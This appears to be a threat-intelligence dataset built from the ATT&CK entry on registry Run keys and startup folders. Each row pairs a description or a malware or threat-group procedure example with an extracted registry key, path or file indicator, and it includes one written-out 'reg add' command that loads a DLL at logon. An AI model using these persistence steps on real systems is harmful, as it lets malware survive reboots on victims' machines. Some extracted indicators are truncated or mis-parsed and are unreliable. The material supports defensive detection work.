T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows
T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,path,"/v 1 /d ""C:\temp\evil.dll"
T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,registry-key,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,path,C:\Users
T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,path,C:\ProgramData\Microsoft\Windows\Start
T1547.001,Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,path,C:\temp\evil
T1547.001,Registry Run Keys  or  Startup Folder,ADVSTORESHELL  achieves persistence by adding itself to the  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  Registry key.   [5]      [6]      [7],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,AppleSeed  has the ability to create the Registry key name  EstsoftAutoUpdate  at  HKCU\Software\Microsoft/Windows\CurrentVersion\RunOnce  to establish persistence.   [12],Procedure Examples,registry-key,HKCU\Software\Microsoft
T1547.001,Registry Run Keys  or  Startup Folder,APT18  establishes persistence via the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  key.   [13]      [14],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,An  APT19  HTTP malware variant establishes persistence by setting the Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\ .   [15],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows
T1547.001,Registry Run Keys  or  Startup Folder,APT37 's has added persistence via the Registry key  HKCU\Software\Microsoft\CurrentVersion\Run\ .   [24]      [25],Procedure Examples,registry-key,HKCU\Software\Microsoft\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,APT41  created and modified startup files for persistence.   [27]      [28]     APT41  added a registry key in  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost  to establish persistence for Cobalt Strike.   [29],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
T1547.001,Registry Run Keys  or  Startup Folder,APT41  created and modified startup files for persistence.   [27]      [28]     APT41  added a registry key in  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost  to establish persistence for Cobalt Strike.   [29],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1547.001,Registry Run Keys  or  Startup Folder,BBSRAT  has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe .,Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr
T1547.001,Registry Run Keys  or  Startup Folder,BBSRAT  has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe .,Procedure Examples,file,ssonsvr.exe
T1547.001,Registry Run Keys  or  Startup Folder,Bisonal  has added itself to the Registry key  HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\  for persistence.   [43]      [44],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,BitPaymer  has set the run key  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  for persistence.   [45],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,BoomBox  can establish persistence by writing the Registry value  MicroNativeCacheSvc  to  HKCU\Software\Microsoft\Windows\CurrentVersion\Run .   [47],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Cardinal RAT  establishes Persistence by setting the   HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load  Registry key to point to its executable.   [53],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
T1547.001,Registry Run Keys  or  Startup Folder,Cardinal RAT  establishes Persistence by setting the   HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load  Registry key to point to its executable.   [53],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1547.001,Registry Run Keys  or  Startup Folder,Chinoxy  has established persistence via the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  registry key and by loading a dropper to  (%COMMON_ STARTUP%\\eoffice.exe) .   [56],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Chinoxy  has established persistence via the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  registry key and by loading a dropper to  (%COMMON_ STARTUP%\\eoffice.exe) .   [56],Procedure Examples,file,eoffice.exe
T1547.001,Registry Run Keys  or  Startup Folder,One persistence mechanism used by  CozyCar  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys:   HKLM\Software\Microsoft\Windows\CurrentVersion\Run\    HKCU\Software\Microsoft\Windows\CurrentVersion\Run\    HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run    HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run    [65],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,One persistence mechanism used by  CozyCar  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys:   HKLM\Software\Microsoft\Windows\CurrentVersion\Run\    HKCU\Software\Microsoft\Windows\CurrentVersion\Run\    HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run    HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run    [65],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,One persistence mechanism used by  CozyCar  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys:   HKLM\Software\Microsoft\Windows\CurrentVersion\Run\    HKCU\Software\Microsoft\Windows\CurrentVersion\Run\    HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run    HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run    [65],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
T1547.001,Registry Run Keys  or  Startup Folder,One persistence mechanism used by  CozyCar  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys:   HKLM\Software\Microsoft\Windows\CurrentVersion\Run\    HKCU\Software\Microsoft\Windows\CurrentVersion\Run\    HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run    HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run    [65],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
T1547.001,Registry Run Keys  or  Startup Folder,Dark Caracal 's version of  Bandook  adds a registry key to  HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run  for persistence.   [68],Procedure Examples,registry-key,HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,DustySky  achieves persistence by creating a Registry entry in  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run .   [75],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"If establishing persistence by installation as a new service fails, one variant of  Elise  establishes persistence for the created .exe file by setting the following Registry key:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe . Other variants have set the following Registry keys for persistence:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self]  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD .   [76]      [77]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost
T1547.001,Registry Run Keys  or  Startup Folder,"If establishing persistence by installation as a new service fails, one variant of  Elise  establishes persistence for the created .exe file by setting the following Registry key:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe . Other variants have set the following Registry keys for persistence:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self]  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD .   [76]      [77]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp
T1547.001,Registry Run Keys  or  Startup Folder,"If establishing persistence by installation as a new service fails, one variant of  Elise  establishes persistence for the created .exe file by setting the following Registry key:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe . Other variants have set the following Registry keys for persistence:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self]  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD .   [76]      [77]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD
T1547.001,Registry Run Keys  or  Startup Folder,"If establishing persistence by installation as a new service fails, one variant of  Elise  establishes persistence for the created .exe file by setting the following Registry key:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe . Other variants have set the following Registry keys for persistence:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self]  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD .   [76]      [77]",Procedure Examples,file,svchost.exe
T1547.001,Registry Run Keys  or  Startup Folder,Emotet  has been observed adding the downloaded payload to the  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  key to maintain persistence.   [79]      [80]      [81],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Empire  can modify the registry run keys  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run  for persistence.   [82],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Empire  can modify the registry run keys  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run  for persistence.   [82],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,EvilGrab  adds a Registry Run key for ctfmon.exe to establish persistence.   [55],Procedure Examples,file,ctfmon.exe
T1547.001,Registry Run Keys  or  Startup Folder,FatDuke  has used  HKLM\SOFTWARE\Microsoft\CurrentVersion\Run  to establish persistence.   [86],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,FinFisher  establishes persistence by creating the Registry key  HKCU\Software\Microsoft\Windows\Run .   [93]      [94],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\Run
T1547.001,Registry Run Keys  or  Startup Folder,FlawedAmmyy  has established persistence via the  HKCU\SOFTWARE\microsoft\windows\currentversion\run  registry key.   [10],Procedure Examples,registry-key,HKCU\SOFTWARE\microsoft\windows\currentversion\run
T1547.001,Registry Run Keys  or  Startup Folder,GuLoader  can establish persistence via the Registry under  HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce .   [110],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
T1547.001,Registry Run Keys  or  Startup Folder,"HTTPBrowser  has established persistence by setting the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  key value for  wdm  to the path of the executable. It has also used the Registry entry  HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn ""%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe""  to establish persistence.   [117]      [118]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"HTTPBrowser  has established persistence by setting the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  key value for  wdm  to the path of the executable. It has also used the Registry entry  HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn ""%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe""  to establish persistence.   [117]      [118]",Procedure Examples,file,VPDN_LU.exe
T1547.001,Registry Run Keys  or  Startup Folder,Inception  has maintained persistence by modifying Registry run key value   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ .   [120],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Some  InnaputRAT  variants establish persistence by modifying the Registry key  HKU\ \Software\Microsoft\Windows\CurrentVersion\Run:%appdata%\NeutralApp\NeutralApp.exe  .   [121],Procedure Examples,file,NeutralApp.exe
T1547.001,Registry Run Keys  or  Startup Folder,Ixeshe  can achieve persistence by adding itself to the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  Registry key.   [123],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,JHUHUGIT  has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.   [125],Procedure Examples,file,rundll32.exe
T1547.001,Registry Run Keys  or  Startup Folder,Kimsuky  has placed scripts in the startup folder for persistence and modified the  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce  Registry key.   [130]      [35]      [131]      [132]      [133],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
T1547.001,Registry Run Keys  or  Startup Folder,Koadic  has added persistence to the  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  Registry key.   [134],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,LoJax  has modified the Registry key  ‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’  from  ‘autocheck autochk  ’   to  ‘autocheck autoche ’  in order to execute its payload during Windows startup.   [143],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute
T1547.001,Registry Run Keys  or  Startup Folder,Lucifer  can persist by setting Registry key values  HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic .   [145],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic
T1547.001,Registry Run Keys  or  Startup Folder,Lucifer  can persist by setting Registry key values  HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic .   [145],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic
T1547.001,Registry Run Keys  or  Startup Folder,"Maze  has created a file named ""startup_vrun.bat"" in the Startup folder of a virtual machine to establish persistence.   [152]",Procedure Examples,file,startup_vrun.bat
T1547.001,Registry Run Keys  or  Startup Folder,"Metamorfo  has configured persistence to the Registry ket  HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe  and used .LNK files in the startup folder to achieve persistence.   [154]      [155]      [156]      [157]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"Metamorfo  has configured persistence to the Registry ket  HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe  and used .LNK files in the startup folder to achieve persistence.   [154]      [155]      [156]      [157]",Procedure Examples,file,Spotify.exe
T1547.001,Registry Run Keys  or  Startup Folder,Mosquito  establishes persistence under the Registry key  HKCU\Software\Run auto_update .   [161],Procedure Examples,registry-key,HKCU\Software\Run
T1547.001,Registry Run Keys  or  Startup Folder,Mustang Panda  has created the registry key  HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU  to maintain persistence.   [168],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU
